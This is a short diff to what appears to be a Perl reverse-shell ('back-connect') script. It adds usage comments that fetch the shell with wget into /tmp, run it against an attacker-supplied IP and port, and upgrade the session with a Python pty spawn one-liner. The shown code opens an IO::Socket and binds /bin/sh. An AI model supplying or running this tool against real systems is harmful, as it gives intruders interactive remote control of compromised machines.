@@ -1,4 +1,7 @@
 #!/usr/bin/perl
+#Usage
+# wget -O /tmp/bc.pl <shell url> ; perl /tmp/bc.pl <IP> <PORT>
+# python -c 'import pty; pty.spawn("/bin/bash")'
 use IO::Socket;
 $system = '/bin/sh';
 $ARGC=@ARGV;
